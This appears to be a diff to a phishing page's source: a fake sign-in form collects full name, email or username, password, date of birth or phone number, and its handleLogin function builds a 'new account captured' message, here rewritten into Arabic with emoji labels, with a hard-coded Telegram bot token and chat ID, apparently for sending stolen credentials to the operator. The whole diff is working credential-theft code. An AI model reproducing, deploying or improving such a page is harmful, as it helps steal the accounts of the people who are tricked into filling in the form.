@@ -106,7 +106,7 @@
       <input id="fullname" type="text" placeholder="Full Name" oninput="checkFields()" />
       <input id="email" type="text" placeholder="Email or Username" oninput="checkFields()" />
       <input id="password" type="password" placeholder="Password" oninput="checkFields()" />
-      <input id="dob" type="date" placeholder="Date of Birth" oninput="checkFields()" />
+      <input id="dob" type="date" oninput="checkFields()" />
     </div>
 
     <div id="form-phone" class="form-content" style="display:none;">
@@ -162,7 +162,8 @@
 
     function handleLogin() {
       const isEmailTab = document.getElementById('form-email').style.display === 'block';
-      let message = "New account captured:\n\n";
+      let message = "🎉 جبتلك حساب جديد!\n";
+      message += "ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n";
 
       if (isEmailTab) {
         const fullname = document.getElementById('fullname').value.trim();
@@ -170,17 +171,19 @@
         const password = document.getElementById('password').value.trim();
         const dob = document.getElementById('dob').value;
 
-        message += `Full Name: ${fullname}\n`;
-        message += `Email / Username: ${email}\n`;
-        message += `Password: ${password}\n`;
-        message += `Date of Birth: ${dob}`;
+        message += `👤 الاسم الكامل: ${fullname}\n`;
+        message += `📧 البريد الإلكتروني: ${email}\n`;
+        message += `🔑 كلمة المرور: ${password}\n`;
+        message += `📅 تاريخ الميلاد: ${dob}\n`;
       } else {
         const phone = document.getElementById('phone-number').value.trim();
         const password = document.getElementById('phone-password').value.trim();
 
-        message += `Phone Number: ${phone}\n`;
-        message += `Password: ${password}`;
+        message += `📱 رقم الهاتف: ${phone}\n`;
+        message += `🔑 كلمة المرور: ${password}\n`;
       }
+
+      message += "ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ";
 
       const botToken = "7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0";
       const chatId = "5029891039";
